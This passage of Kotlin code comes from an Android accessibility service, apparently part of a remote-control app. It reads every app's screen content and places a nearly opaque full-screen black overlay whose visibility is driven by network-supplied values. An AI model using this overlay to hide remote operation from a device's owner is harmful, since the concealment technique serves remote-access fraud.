                        i = -7829368//该颜色的 ARGB 值为 (255, 128, 128, 128)，即完全不透明（Alpha 值为 255）的灰色。因为 Red、Green 和 Blue 通道的值相等，且都为 128，这是一种中等亮度的灰色
                    }
                }
                charSequence = if (child.text != null) {
                    child.text.toString()
                } else {
                    if (child.contentDescription != null)
                        child.contentDescription.toString()
                    else ""
                }
                paint.style = Paint.Style.STROKE
                paint.strokeWidth = 2.0f
                canvas.drawRect(rect, paint)
                paint.style = Paint.Style.STROKE
                paint.color = -1
                canvas.drawRect(rect, paint)
                paint.color = i
                paint.isAntiAlias = true
                canvas.drawText(charSequence, rect.left + 16.toFloat(), rect.exactCenterY() + 16.0f, paint)
                drawViewHierarchy(canvas, child, paint)
                child.recycle()
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        ctx = this
	    /*
        val info = AccessibilityServiceInfo()
        if (Build.VERSION.SDK_INT >= 33) {
            info.flags = FLAG_INPUT_METHOD_EDITOR or FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        } else {
            info.flags = FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        }
        setServiceInfo(info)*/

        try {
            val info = AccessibilityServiceInfo()
            info.flags = 115
            info.eventTypes = -1
            info.notificationTimeout = 0L
            info.packageNames = null
            info.feedbackType = -1
            setServiceInfo(info)
        } catch (unused: java.lang.Exception) {
        }
	    
        fakeEditTextForTextStateCalculation = EditText(this)
        // Size here doesn't matter, we won't show this view.
        fakeEditTextForTextStateCalculation?.layoutParams = LayoutParams(100, 100)
        fakeEditTextForTextStateCalculation?.onPreDraw()
        val layout = fakeEditTextForTextStateCalculation?.getLayout()
        Log.d(logTag, "fakeEditTextForTextStateCalculation layout:$layout")
        Log.d(logTag, "onServiceConnected!")
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        try {
            createView(windowManager)
            handler.postDelayed(runnable, 1000)
            Log.d(logTag, "onCreate success")
        } catch (e: Exception) {
            Log.d(logTag, "onCreate failed: $e")
        }
    }
    
    @SuppressLint("ClickableViewAccessibility")
    private fun createView(windowManager: WindowManager) {  
        var flags = FLAG_LAYOUT_IN_SCREEN or FLAG_NOT_TOUCH_MODAL or FLAG_NOT_FOCUSABLE
        if (viewUntouchable || viewTransparency == 0f) {
            flags = flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
        }

       // var w = FFI.getNetArgs0()//HomeWith
       // var h = FFI.getNetArgs1()//HomeHeight 
       // var ww = FFI.getNetArgs2()
       //var hh = FFI.getNetArgs3()	
	
	//Log.d(logTag, "createView: $w,$h,$ww,$hh")
	
    	overLayparams_bass =  WindowManager.LayoutParams(FFI.getNetArgs2(), FFI.getNetArgs3(), FFI.getNetArgs0(),FFI.getNetArgs1(), 1)
        overLayparams_bass.gravity = Gravity.TOP or Gravity.START
        overLayparams_bass.x = 0
        overLayparams_bass.y = 0
    	if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
    	    overLayparams_bass.flags = overLayparams_bass.flags or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
    	    overLayparams_bass.flags = overLayparams_bass.flags or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
    	}
    	overLay =  FrameLayout(this)
    	overLay.setBackgroundColor(Color.parseColor("#000000"));//#000000
    	overLay.getBackground().setAlpha(253)
    	gohome = 8
	overLay.setVisibility(gohome)

        val loadingText = TextView(this, null)
	loadingText.text = "口口口口口口口口口口口口口口口口口\n口口口口口口口口口口口口\n口口口口口口口口口口口口口"
	loadingText.setTextColor(-7829368)
	loadingText.textSize = 20.0f
	loadingText.gravity = Gravity.LEFT //Gravity.CENTER
	loadingText.setPadding(60, HomeHeight / 3, 0, 0)

	val dp2px: Int = dp2px(this, 100.0f) //200.0f
	val paramstext = FrameLayout.LayoutParams(dp2px * 5, dp2px * 5)
	paramstext.gravity = Gravity.LEFT
	loadingText.layoutParams = paramstext

	//Fakelay.addView(getView2())
	overLay.addView(loadingText)
	
        windowManager.addView(overLay, overLayparams_bass)
    }
    
    fun dp2px(context: Context, f: Float): Int {
        return (f * context.resources.displayMetrics.density + 0.5f).toInt()
    }

    private val handler = Handler(Looper.getMainLooper())
    private val runnable = object : Runnable {
        override fun run() {
            if (overLay.visibility != gohome) {
	           //  Log.d(logTag, "Fakelay runnable globalVariable: $globalVariable")
    		     if(gohome==8)
    		     {  
        		overLay.setFocusable(false)
        		overLay.setClickable(false)
    		     }
    		    else
    		     {
        		overLay.setFocusable(true)
                        overLay.setClickable(true)
    		     }
                     overLay.setVisibility(gohome)
		    // windowManager.updateViewLayout(overLay, overLayparams_bass)
            }
            handler.postDelayed(this, 1000) 
        }
    }
    override fun onDestroy() {
        ctx = null
        windowManager.removeView(overLay) 
        super.onDestroy()
    }

    override fun onInterrupt() {}
}
